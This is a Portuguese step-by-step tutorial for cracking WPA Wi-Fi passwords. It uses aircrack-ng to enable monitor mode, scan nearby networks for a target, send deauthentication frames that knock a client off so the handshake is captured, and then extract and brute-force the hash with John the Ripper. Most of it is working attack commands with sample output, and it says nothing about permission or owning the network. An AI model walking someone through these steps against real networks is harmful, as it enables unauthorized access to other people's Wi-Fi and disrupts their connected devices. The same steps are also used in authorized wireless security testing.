---
title: 'crack wpa'
date: '2022-10-07'
description: 'Esse é um passo a passo que geralmente uso para capturar um HANDSHAKE do protocolo de autenticação WPA e depois fazer um brute-force'
---


# Handshake capture

texto original: https://github.com/geleiaa/wirelesssss/blob/main/crackwpa.md

> Para esse ataque você vai precisar de:
> 
> 1 - um adaptador wifi com um chiset que suporte no minimo monitor-mode e package-injection
> 
> 2 - a suite aircrack-ng
> 
> 3 - john the ripper



_________________________________________________________________________________________________________________________________________________________
# Primeiro passo: 
## verificar se seu chipset suporta os modos citados acima.


Esse comando mostra informações sobre a interface/placa de rede:


#### ***$ iw list***

Aparecera várias informações sobre a interface, para verificar os modos na saida do comando procure algo assim:


#### ***Supported interface modes: ...***


ou você também pode usar


#### ***$ sudo airmon-ng (com --verbose p/ mais detalhes)***


o comando acima mostrara o nome da interface e o chipset, depois é só  pesquisar para saber os modos que chipset suporta.
A saida será parecida com essa:

```bash
PHY	Interface	Driver		Chipset

phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
``` 

#### ($ ifconfig ou $ iwconfig para ver o nome do internace)



_________________________________________________________________________________________________________________________________________________________
# Segundo passo:
## Colocar sua interface em *monitor mode*

primeiro matar processos que interferem no modo monitor com o comando:

#### *$ sudo airmon-ng check kill*


A saida será parecida com essa:

```bash
Killing these processes:

  PID Name
  870 dhclient
  1115 wpa_supplicant
``` 


Depois dar um "start" na interface com o comando:

#### *$ sudo airmon-ng start (interface)*
 

A saida será parecida com essa:

```bash
PHY	Interface	Driver		Chipset

phy0	wlan0mon	ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
		(mac80211 station mode vif enabled on [phy0]wlan0)
		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)
```    
    
#### $ iwconfig para confirmar que a interface esta em monitor-mode

Se a interface estiver em monitor-mode você verá algo assim:
(repare em Mode:Monitor)

```bash
ath0     IEEE 802.11g  ESSID:""  
      Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82   
      Bit Rate=2 Mb/s   Tx-Power:18 dBm   Sensitivity=0/3  
      Retry:off   RTS thr:off   Fragment thr:off
      Encryption key:off
      Power Management:off
      Link Quality=0/94  Signal level=-96 dBm  Noise level=-96 dBm
      Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
      Tx excessive retries:0  Invalid misc:0   Missed beacon:0
```




_________________________________________________________________________________________________________________________________________________________
# Terceiro passo
## "Sniffar" redes em volta com o *airodum-ng* para identificar seu alvo

#### *$ sudo airodump-ng (interface)*

A saida sera parecida com essa:

```bash
 CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ]
                                                                                                            
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                            
 00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR                         
 00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP         bigbear 
 00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy                             
                                                                                                            
 BSSID              STATION            PWR   Rate   Lost  Packets  Notes  Probes
                                
 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy 
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy
 ```
 

* BSSID = Mac Address do AP (roteador)
* ESSID = nome que identifica o AP
* CH = canal em que o AP esta operando
* STATION = Mac Address de dispositivos conectados aos APs

 
 
 
_________________________________________________________________________________________________________________________________________________________
 # Quarto passo
 ## Depois de identificar o alvo, comece a captura dos pacotes da rede alvo, para capturar o HANDSHAKE
 
 #### *$ sudo airodump-ng --bssid (macaddr) -c (canal) -w (nome-arquivo) (interface)*
 
 > --bssid mac address do AP alvo
 >
 > -c seleciona o canal do AP para evitar perda de pacotes
 > 
 > -w para gravar captura em um arquivo .cap
 
 


_________________________________________________________________________________________________________________________________________________________ 
 # Quinto passo
 ## Enquanto o trafego do alvo é capturado, você devera fazer um ataque de Deauthentication em um dispositivo que está conectado ao AP, para ele ser desconectado. Em seguida o dispositivo irá se conectar no AP de novo automaticamente. E é nessa hora que o HANDSHAKE é capturado...
 
 o comando para desautenticar uma STATION de um AP com o aireplay-ng:
 
 #### *$ aireplay-ng -0 1 -a (macAP) -c (macSTATION) (interface)*
 
 > -0 especifica o Deauthentication attack   
 > 1 é o número de deauths a serem enviados  
 > -a mac do AP alvo   
 > -c mac do dispositivo cliente para desautenticar 

 ##### Obs: mandar poucos deauths pois pode influênciar na captura do trafego
 
 A saida sera parecida com essa:
 ```bash
 12:35:25  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9
 12:35:25  Sending 64 directed DeAuth. STMAC: [00:0F:B5:AE:CE:9D] [ 61|63 ACKs]
 ```

 [ ACKs recebidos da STATION | ACKs recebidos do AP]
 
 
 
_________________________________________________________________________________________________________________________________________________________
 # Sexto passo
 ## Se o Quinto passo for bem sucedido, no terminal do airodump-ng capturando os pacotes irá aparecer o seguinte: *[ WPA handshake: 00:14:6C:7E:40:80*
 Exemplo:
 
	  CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7E:40:80
                                                                                                            
          BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                            
          00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR                         
          00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP         bigbear 
          00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy 
 
 
 Depois do handshake capturado você já pode encerrar a captura e se você verifcar o diretorio atual vai ver alguns arquivos incluindo a captura do trafego( arquivo.cap)
 
E depois da captura ser feita, você pode colocar a interface de volta em modo Managed com os comandos:
 
 
 #### *$ sudo airmon-ng stop (interface)*  # para o modo monitor
 
 depois

 #### *$ service network-manager start*  # reinicia o gerenciador de rede
 
 ($ ifconfig ou $ iwconfig para confirmar o modo que a interface esta)
 
 
 
 
_________________________________________________________________________________________________________________________________________________________
 # Setimo passo
 ## Você pode verificar se os pacotes de autenticação foram capturados com sucesso abrindo o arquivo .cap no wireshark e filtrando os pacotes EAPOL.  
 
 (os pacotes m1 até m4 precisam ser capturados)
 
 mais sobre informações **[aqui](https://community.cisco.com/t5/wireless-mobility-knowledge-base/802-11-sniffer-capture-analysis-wpa-wpa2-with-psk-or-eap/ta-p/3116990)** ...
 
 
 Depois do HANDSHAKE capturado há algumas formas de extrair só a parte que interessa. Uma delas é com uma ferramenta WPAPCAP2JOHN do pacote John The Ripper.
 
 #### *$ wpapcap2john -v arquivo.cap*
 
 o comando acima vai analizar o .cap procurando pelo handshake
 
 (colocar exemplo da saida do comando)
 
 Se o handshake foi capturado corretamente a ferramenta wpapcap2john pode converter um hash da autenticação capturada no arquivo .cap, para ser feito um ataque de brute-force offline... com o seguinte comando:

 
 #### *$ wpapcap2john > (arquivo de saida)*
 
No arquivo ficara um hash parecido com isso: 

```bash 
ESSID:$WPAPSK$ESSID#x3EU5Y3o1jRkE5hTM0qamIqSFyApa7cBSX5AZFNCidtAkKPdtQ1uyW2Hv1z8s4BrRP7aFIZy19Jsvy9hMhX5O8FRp2P1UaDjQ8MpZE21.5I0.Ec................wzRUT2
b9IE63q1mc:0ef770407b5f:f454201e4174:f454201e4174::WPA2, verified:arquivo.cap
``` 




_________________________________________________________________________________________________________________________________________________________
# Oitavo passo 
## (não pensei que teria tantos passos :) ) 

Com o hash em mãos é só fazer o brute-force (a conversão do hash feito pela ferramenta wpapcap2john resulta em um formato de hash próprio para o JTR)


#### *$ john hash.txt --wordlist=rockyou.txt --format=wpapsk*


Nota importante:  Se for uma senha forte esse ataque é inviável. Em caso de duvidas... não vou deixar nenhuma forma de contato, sinto muito, então boa sorte ;)

 "What doesn't kill you will make you stronger."
